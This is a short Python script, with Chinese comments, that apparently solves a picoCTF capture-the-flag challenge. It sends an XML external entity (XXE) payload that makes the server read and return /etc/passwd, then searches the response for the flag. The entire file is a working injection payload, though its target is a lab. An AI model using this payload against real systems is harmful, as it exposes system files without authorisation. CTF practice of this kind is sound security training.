import re
import requests

URL = "http://amiable-citadel.picoctf.net:52204/data"

# 構造惡意 XML Payload
# 1. XML 宣告
# 2. DOCTYPE 定義一個外部實體 xxe，指向 file:///etc/passwd
# 3. 在 <ID> 中呼叫 &xxe; 讓伺服器讀取該檔案內容並回傳
payload = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data><ID>&xxe;</ID></data>"""

headers = {"Content-Type": "application/xml"}

print(f"[*] Sending XXE payload to {URL}")
print(f"[*] Payload:\n{payload}\n")

resp = requests.post(URL, data=payload, headers=headers)
print(f"[*] Status: {resp.status_code}\n")
print(f"[*] Response:\n{resp.text}\n")

# 自動搜尋 flag
flags = re.findall(r"picoCTF\{[^}]+\}", resp.text)
if flags:
    print(f"[+] Found flag: {flags[0]}")
else:
    print("[-] No picoCTF flag found in response.")
